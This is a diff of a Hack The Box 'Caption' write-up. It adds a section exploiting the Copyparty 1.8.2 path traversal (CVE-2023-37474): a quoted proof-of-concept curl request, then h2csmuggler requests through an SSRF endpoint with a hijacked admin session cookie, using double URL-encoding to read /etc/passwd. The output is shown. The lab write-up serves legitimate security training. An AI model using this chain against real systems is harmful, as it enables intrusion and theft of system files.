@@ -3,7 +3,7 @@ layout: writeup
 category: HTB
 date: 2024-12-29
 comments: false
-tags: gitbucket codereview informationleakage apachethrift wfuzz cache varnish xss crosssitescripting sessionhijacking webcachepoisoning
+tags: gitbucket codereview informationleakage apachethrift wfuzz cache varnish haproxy xss crosssitescripting sessionhijacking webcachepoisoning
 ---
 
 <br />
@@ -639,7 +639,7 @@ There are three urls related to the `/download` endpoint poiting to log files.
 
 We can use the bypass technique to access them but we don't found nothing relevant.
 
-Another thing that we can do is to enumerate the root of this server:
+Another useful step is to enumerate the `root` parth of this `internal` service:
 
 <br />
 
@@ -661,6 +661,186 @@ Another thing that we can do is to enumerate the root of this server:
 
 The important information is at the end of the output.
 
+<br />
+
 ## Copyparty 1.8.2 LFI (Local File Inclusion):
 
 <br />
+
+There is a strange directory in the `<script src>` tags called `.cpr`. If we make some researching, we will find that this is a common path in the `Copyparty` application with a very famous vulnerability in its `1.8.2` version.
+
+We can find more information of this CVE in [exploit-db](https://www.exploit-db.com/exploits/51636).
+
+<br />
+
+```bash
+# Exploit Title: copyparty 1.8.2 - Directory Traversal
+# Date: 14/07/2023
+# Exploit Author: Vartamtzidis Theodoros (@TheHackyDog)
+# Vendor Homepage: https://github.com/9001/copyparty/
+# Software Link: https://github.com/9001/copyparty/releases/tag/v1.8.2
+# Version: <=1.8.2
+# Tested on: Debian Linux
+# CVE : CVE-2023-37474
+
+
+
+
+#Description
+Copyparty is a portable file server. Versions prior to 1.8.2 are subject to a path traversal vulnerability detected in the `.cpr` subfolder. The Path Traversal attack technique allows an attacker access to files, directories, and commands that reside outside the web document root directory.
+
+#POC
+curl -i -s -k -X  GET 'http://127.0.0.1:3923/.cpr/%2Fetc%2Fpasswd'
+```
+
+<br />
+
+With the exploit source code we can confirm the port `39323`.
+
+If reply this exploitation with our target, it doesn't work:
+
+<br />
+
+```bash
+❯ python3 h2csmuggler.py -x http://caption.htb 'http://caption.htb/download?url=http://localhost:3923/.cpr/%2Fetc%2Fpasswd' -H "Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzUxMzE1MjgxfQ.mvCRs4piEnvcTrPfVV8aCrDrQBw2yNLyZPco8eXzNoc"
+...[snip]...
+[INFO] Requesting - /download?url=http://localhost:3923/.cpr/%2Fetc%2Fpasswd
+:status: 200
+server: Werkzeug/3.0.1 Python/3.10.12
+date: Mon, 30 Jun 2025 20:02:57 GMT
+content-type: text/html; charset=utf-8
+content-length: 1898
+x-varnish: 131170
+age: 0
+via: 1.1 varnish (Varnish/6.6)
+x-cache: MISS
+accept-ranges: bytes
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta charset="utf-8">
+	<title>copyparty</title>
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=0.8">
+	<meta name="theme-color" content="#333">
+
+	<link rel="stylesheet" media="screen" href="/.cpr/splash.css?_=YrpB">
+	<link rel="stylesheet" media="screen" href="/.cpr/ui.css?_=YrpB">
+</head>
+
+<body>
+	<div id="wrap">
+		<a id="a" href="/?h" class="af">refresh</a>
+		<a id="v" href="/?hc" class="af">connect</a>
+			<p id="b">howdy stranger &nbsp; <small>(you're not logged in)</small></p>
+		<div id="msg">
+			<h1 id="n">404 not found &nbsp;┐( ´ -`)┌</h1><p><a id="r" href="/?h">go home</a></p>
+		</div>
+
+		<h1 id="cc">client config:</h1>
+		<ul>
+			
+			<li><a id="i" href="/?k304=y" class="r">enable k304</a> (currently disabled)
+			
+			<blockquote id="j">enabling this will disconnect your client on every HTTP 304, which can prevent some buggy proxies from getting stuck (suddenly not loading pages), <em>but</em> it will also make things slower in general</blockquote></li>
+			
+			<li><a id="k" href="/?reset" class="r" onclick="localStorage.clear();return true">reset client settings</a></li>
+		</ul>
+
+		<h1 id="l">login for more:</h1>
+		<div>
+			<form method="post" enctype="multipart/form-data" action="/.cpr/etc/passwd">
+				<input type="hidden" name="act" value="login" />
+				<input type="password" name="cppwd" />
+				<input type="submit" value="Login" />
+				
+			</form>
+		</div>
+	</div>
+	<a href="#" id="repl">π</a>
+	<span id="pb"><span>powered by</span> <a href="https://github.com/9001/copyparty">copyparty </a></span>
+	<script>
+
+var SR = "",
+	lang="eng",
+	dfavico="🎉 000 none";
+
+document.documentElement.className=localStorage.theme||"az a z";
+
+</script>
+<script src="/.cpr/util.js?_=YrpB"></script>
+<script src="/.cpr/splash.js?_=YrpB"></script>
+</body>
+</html>
+```
+
+<br />
+
+This happen because our request is going through multiple proxies and we need to URL-Encode more than one time. 
+
+To solve this, we only need to doble url-encoding the `%` symbols adding a `%25`.
+
+<br />
+
+```bash
+❯ python3 h2csmuggler.py -x http://caption.htb 'http://caption.htb/download?url=http://localhost:3923/.cpr/%252Fetc%252Fpasswd' -H "Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzUxMzE1MjgxfQ.mvCRs4piEnvcTrPfVV8aCrDrQBw2yNLyZPco8eXzNoc"
+...[snip]...
+[INFO] Requesting - /download?url=http://localhost:3923/.cpr/%252Fetc%252Fpasswd
+:status: 200
+server: Werkzeug/3.0.1 Python/3.10.12
+date: Mon, 30 Jun 2025 20:06:50 GMT
+content-type: text/html; charset=utf-8
+content-length: 2122
+x-varnish: 294955
+age: 0
+via: 1.1 varnish (Varnish/6.6)
+x-cache: MISS
+accept-ranges: bytes
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+syslog:x:107:113::/home/syslog:/usr/sbin/nologin
+uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
+tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
+landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
+fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
+haproxy:x:114:120::/var/lib/haproxy:/usr/sbin/nologin
+varnish:x:115:121::/nonexistent:/usr/sbin/nologin
+vcache:x:116:121::/nonexistent:/usr/sbin/nologin
+varnishlog:x:117:121::/nonexistent:/usr/sbin/nologin
+margo:x:1000:1000:,,,:/home/margo:/bin/bash
+ruth:x:1001:1001:,,,:/home/ruth:/bin/bash
+_laurel:x:998:998::/var/log/laurel:/bin/false
+```
+
+<br />
+
+We successfully retrieved the `/etc/passwd` from the victime machine.
